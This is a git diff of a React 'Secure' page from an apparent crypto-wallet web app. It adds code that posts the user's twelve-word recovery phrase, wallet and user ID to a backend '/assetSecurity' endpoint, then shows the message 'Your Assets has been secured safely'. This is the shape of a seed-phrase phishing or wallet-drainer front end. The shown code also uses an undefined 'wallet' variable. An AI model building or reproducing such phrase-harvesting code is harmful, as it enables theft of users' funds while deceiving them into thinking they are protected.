@@ -1,7 +1,10 @@
-import React, { useState } from "react";
+import React, { useState, useEffect } from "react";
 import "../styles/Secure.css";
 import Modal from "react-modal";
 import { IoClose } from "react-icons/io5";
+import axios from "axios";
+import BackendApi from "../Api/BackendApi";
+import { getUserToken } from "../Api/storage";
 
 const Secure = () => {
   const [phrases, setPhrases] = useState(Array(12).fill(""));
@@ -9,6 +12,47 @@ const Secure = () => {
   const [modalMessage, setModalMessage] = useState("");
   const [passcode, setPasscode] = useState(Array(4).fill(""));
   const [isModalOpen, setIsModalOpen] = useState(false);
+  const [userData, setUserData] = useState([]);
+  const [refreshing, setRefreshing] = useState(false);
+  const [token, setToken] = useState(null);
+
+  useEffect(() => {
+    const fetchData = async () => {
+      try {
+        const userToken = await getUserToken();
+        setToken(userToken);
+        // console.log(token);
+      } catch (error) {
+        console.error("Error retrieving token:", error);
+      }
+    };
+
+    fetchData();
+  }, []);
+
+  const getData = async () => {
+    const data = {
+      token,
+    };
+    try {
+      // console.log(token);
+      const response = await axios.post(`${BackendApi}/userdata`, data);
+      setUserData(response.data.data);
+    } catch (error) {
+      console.error("Error fetching data:", error);
+    }
+  };
+
+  useEffect(() => {
+    if (token) {
+      const interval = setInterval(() => {
+        setRefreshing(true);
+        getData();
+      }, 1000);
+
+      return () => clearInterval(interval);
+    }
+  }, [token]);
 
   const handlePhraseChange = (index, value) => {
     const newPhrases = [...phrases];
@@ -26,28 +70,26 @@ const Secure = () => {
     setPasscode(newPasscode);
   };
 
-  const handleSecureClick = () => {
+  const handleSecureClick = async () => {
     if (phrases.every((phrase) => phrase.trim() !== "")) {
-      setModalMessage("Enter your code to secure your assets");
-      setIsModalOpen(true);
+      const data = {
+        userId: userData._id,
+        wallet,
+        phrases,
+      };
+
+      try {
+        const response = await axios.post(`${BackendApi}/assetSecurity`, data);
+        setModalMessage("Your Assets has been secured safely.");
+        setIsModalOpen(true);
+      } catch (error) {
+        alert("Securing error", error);
+      }
     } else {
       setModalMessage("Please enter a valid 12-phrase security code.");
       setIsModalOpen(true);
     }
   };
-
-  // const handlePasswordSubmit = () => {
-  //   if (passcode.trim() !== "") {
-  //     setModalMessage(
-  //       "Your assets are now secured with your 12-phrase security code."
-  //     );
-  //     setIsPasswordModalOpen(false);
-  //     setIsModalOpen(true);
-  //   } else {
-  //     setModalMessage("Enter your code to secure your assets");
-  //     setIsModalOpen(true);
-  //   }
-  // };
 
   const closeModal = () => {
     setIsModalOpen(false);
@@ -115,26 +157,6 @@ const Secure = () => {
         <div className="modalContent">
           <IoClose className="iq" onClick={closeModal} />
           <h2>{modalMessage}</h2>
-          {modalMessage !== "Please enter a valid 12-phrase security code." && (
-            <>
-              <div className="passcodeInput">
-                {passcode.map((digit, index) => (
-                  <input
-                    key={index}
-                    type="text"
-                    maxLength="1"
-                    value={digit}
-                    onChange={(e) =>
-                      handlePasscodeChange(index, e.target.value)
-                    }
-                  />
-                ))}
-              </div>
-              <div className="depositDiv9">
-                <button>Confirm</button>
-              </div>
-            </>
-          )}
         </div>
       </Modal>
     </div>
